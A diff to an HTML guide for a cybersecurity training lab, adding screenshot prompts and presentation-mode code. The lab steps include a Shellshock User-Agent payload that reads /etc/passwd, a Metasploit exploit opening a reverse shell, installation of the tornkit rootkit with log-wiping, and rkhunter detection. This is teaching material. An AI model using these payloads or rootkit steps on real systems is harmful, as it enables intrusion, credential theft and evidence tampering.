@@ -224,6 +224,9 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 .env-table td code,.env-table th code{font-family:var(--mono);font-size:.86em}
 .env-table tbody tr:hover{background:var(--card-2)}
 .env-note{color:var(--muted);font-size:.86rem;margin-top:6px}
+
+html[data-present="on"] .container > .callout{display:none!important}
+html[data-present="on"][data-pm-index="0"] .container > .callout{display:block!important}
 </style>
 </head>
 <body>
@@ -321,8 +324,9 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">4</span> In the Terminal, enter the command below. When prompted, enter the password NDGlabpass123!.</p>
 <div class="code-block"><span class="pr">sysadmin@seconion:~$</span> sudo docker run --rm -it -p 4444:80 vulnerables/cve-2014-6271</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Rootkit installed.</span> the <code class='inl'>./t0rn</code> output (and <code class='inl'>ls</code> no longer behaving).</span></div>
 </div>
-<div class="step"><p><span class="snum">5</span> Ignore the apache2 message (shown in the screenshot below).</p>
+<div class="step"><p><span class="snum">5</span> Ignore the apache2 message.</p>
 <div class="callout tip"><span class="tag">[NOTE]</span> If your docker brings you back to the bash, please try restarting your VM and run the command again.</div>
 </div>
 <div class="step"><p><span class="snum">6</span> Click on Kali.</p>
@@ -332,6 +336,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">8</span> Click the Web Browser icon located in the top menu bar.</p>
 </div>
 <div class="step"><p><span class="snum">9</span> Once the Web Browser opens, go to pfSense on address http://203.0.113.1, then sign in using username sysadmin and password NDGlabpass123!</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Perimeter restored.</span> the pfSense rule re-enabled and changes applied.</span></div>
 </div>
 <div class="step"><p><span class="snum">10</span> Once logged in, click to go to Firewall &gt; Rules.</p>
 </div>
@@ -340,17 +345,18 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">12</span> Click the green Apply Changes button to make the change effective.</p>
 </div>
-<div class="step"><p><span class="snum">13</span> In the address bar, type and go to the address: 192.168.0.6:4444. If prompted with a warning for potential risk, click the Advanced... button and then click the Accept the Risk and Continue button. You should see something like this:</p>
+<div class="step"><p><span class="snum">13</span> In the address bar, type and go to the address: 192.168.0.6:4444. If prompted with a warning for potential risk, click the Advanced. button and then click the Accept the Risk and Continue button. You should see something like this:</p>
 </div>
 <div class="step"><p><span class="snum">14</span> To the right side of the address bar, find and click the Tamper Data add-on. It may take 1 minute for the tool to finish loading.</p>
 </div>
 <div class="step"><p><span class="snum">15</span> Scroll down to the bottom in the pop-up window and click Yes.</p>
 </div>
-<div class="step"><p><span class="snum">16</span> From step 13, the page says the script is at /cgi-bin/vulnerable; we will visit the page by typing the path behind the address, like below. Press Enter.</p>
+<div class="step"><p><span class="snum">16</span> From step 13, the page says the script is at /cgi-bin/vulnerable; we will visit the page by typing the path behind the address. Press Enter.</p>
 </div>
 <div class="step"><p><span class="snum">17</span> Allow the tool to load. A new pop-up will be shown; respond by selecting OK.</p>
 </div>
-<div class="step"><p><span class="snum">18</span> Another window opens, and we are going to edit the User-Agent value field. Delete everything that is in the Value column field for User-Agent, then type the string below as the malicious User-Agent. Then click OK to proceed. () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'</p>
+<div class="step"><p><span class="snum">18</span> Another window opens, and we are going to edit the User-Agent value field. Delete everything that is in the Value column field for User-Agent, then type the string below as the malicious User-Agent. Then click OK to proceed. () {:; }; echo; echo; /bin/bash -c 'cat /etc/passwd'</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Shellshock confirmed.</span> the server returning /etc/passwd via the crafted User-Agent header.</span></div>
 </div>
 <div class="step"><p><span class="snum">19</span> If successful, you should see the content of the passwd file has been pulled from the SecOnion machine. We now successfully exploited the Shellshock vulnerability.</p>
 </div>
@@ -367,7 +373,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">4</span> The search will return a list of results; the exploit/multi/http/apache_mod_cgi_bash_env_exec is the one we want. Thus, type use 1.</p>
 </div>
 <div class="step"><p><span class="snum">5</span> The Metasploit will load the module we just selected. Here we want to type show options to see what settings we can change.</p>
-<div class="callout tip"><span class="tag">[NOTE]</span> The words in red color in the screenshot below indicate the current module we are working on.</div>
+<div class="callout tip"><span class="tag">[NOTE]</span> The current module you are working on is highlighted in the tool.</div>
 </div>
 <div class="step"><p><span class="snum">6</span> Now we have the information. After examining the options, we understand that RHOSTS is the victim address, RPORT is the victim port, and TARGETURI will be the vulnerable executable path on the website. So, we will be changing these two options.</p>
 </div>
@@ -380,6 +386,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="code-block"><span class="pr">msf6&gt;</span> set payload payload/linux/x64/shell_reverse_tcp</div>
 </div>
 <div class="step"><p><span class="snum">9</span> Next, type exploit to execute and attack the victim machine. Wait a couple of seconds; when it almost feels like the computer freezes, you can start typing in whoami and pwd to execute commands on the victim system.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Shell gained.</span> the Metasploit session with <code class='inl'>whoami</code>/<code class='inl'>pwd</code> on 192.168.0.6.</span></div>
 </div>
 <div class="step"><p><span class="snum">10</span> You successfully gain access to the victim system. You can test other Linux commands that you know. Once you finish your testing, type exit to get out of the reverse shell.</p>
 </div>
@@ -409,8 +416,9 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 <div class="step"><p><span class="snum">1</span> After successfully creating the backdoor, we noticed that the ls command no longer works.</p>
 </div>
 <div class="step"><p><span class="snum">2</span> When the ls command is no longer useful, tornkit could hide its secret directories. Let's directly head to the hidden directory created by the tornkit. Type cd /usr/src/.puta to go to the hidden directory.</p>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Hiding spot.</span> a listing of a hidden directory such as <code class='inl'>/usr/src/.puta</code>.</span></div>
 </div>
-<div class="step"><p><span class="snum">3</span> As an attacker, we would want to clean our tracks. While in the hidden directory, type ./t0rnsb root to clean the tracks.</p>
+<div class="step"><p><span class="snum">3</span> As an attacker, we would want to clean our tracks. While in the hidden directory, type./t0rnsb root to clean the tracks.</p>
 <div class="callout tip"><span class="tag">[NOTE]</span> The t0rnsb deletes lines that match a specific string from the system log files.</div>
 </div>
 <div class="step"><p><span class="snum">4</span> Another hidden directory created by the rootkit can be found in the path /usr/info/.t0rn. Let's go to the other hidden directory. Type cd /usr/info/.t0rn.</p>
@@ -424,6 +432,7 @@ code.inl{font-family:var(--mono);font-size:.88em;background:var(--card-2);
 </div>
 <div class="step"><p><span class="snum">2</span> Run the rkhunter to check for rootkits, backdoors, and possible exploits.</p>
 <div class="code-block"><span class="pr">kali@kali$</span> sudo rkhunter --check</div>
+<div class="shot-mark"><span class="cam">📸</span><span><b>Screenshot for your report:</b> <span class="shot">Rootkit detected.</span> the <code class='inl'>rkhunter --check</code> warning lines.</span></div>
 </div>
 <div class="step"><p><span class="snum">3</span> You will see a few prompts with a Warning, but most of them are OK. When prompted, press the Enter key to continue.</p>
 </div>
@@ -764,6 +773,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
     if (!sections.length) return;
     idx = Math.max(0, Math.min(sections.length - 1, i));
     sections.forEach(function (s, n) { s.classList.toggle("pm-current", n === idx); });
+    root.setAttribute("data-pm-index", String(idx));
     if (countEl) countEl.textContent = (idx + 1) + " / " + sections.length;
     if (nameEl) nameEl.textContent = labelFor(sections[idx]);
     if (prevBtn) prevBtn.disabled = idx === 0;
@@ -785,6 +795,7 @@ html[data-present="on"] .pm-dock{position:fixed;left:0;right:0;bottom:0;z-index:
   function exit() {
     root.removeAttribute("data-present");
     sections.forEach(function (s) { s.classList.remove("pm-current"); });
+    root.removeAttribute("data-pm-index");
     if (dock) dock.setAttribute("aria-hidden", "true");
     var btn = document.getElementById("pmToggle");
     if (btn) { btn.setAttribute("aria-pressed", "false");
